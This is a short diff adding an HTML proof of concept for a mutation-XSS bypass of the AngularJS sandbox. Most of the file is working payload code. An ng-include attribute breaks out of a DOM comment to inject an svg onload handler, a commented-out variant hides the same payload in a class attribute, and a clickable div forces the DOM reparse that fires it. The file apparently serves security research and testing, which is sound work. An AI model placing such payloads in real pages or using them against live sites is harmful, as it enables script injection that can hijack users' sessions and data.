@@ -1,0 +1,11 @@
+<!--This will not cause errors from angularjs ng-include, but use another sandbox bypass based on class attribute-->
+<!--<b class="ng-include:'somefile?--&gt;&lt;svg&sol;onload=alert&lpar;1&rpar;&gt;'">HELLO</b>-->
+
+
+<!-- This bypass suppose that an attacker can somehow inject code in url. It can be search field or hash or any other part -->
+<!-- After ng-include execute (does not matter its successfulness) it writes comment with url string using function document.createComment -->
+
+<b ng-include='somefile?--><svg/height="10"/width="10"/onload=alert(123)>'>Include implementation error</b>
+
+<!-- This bypass relies on any change in DOM model (in this example you must click button), that will triger browser to reparse DOM and execute string in comment, that was written previously -->
+<div onclick="this.parentElement.innerHTML+=1">click to triger mutated XSS</div>
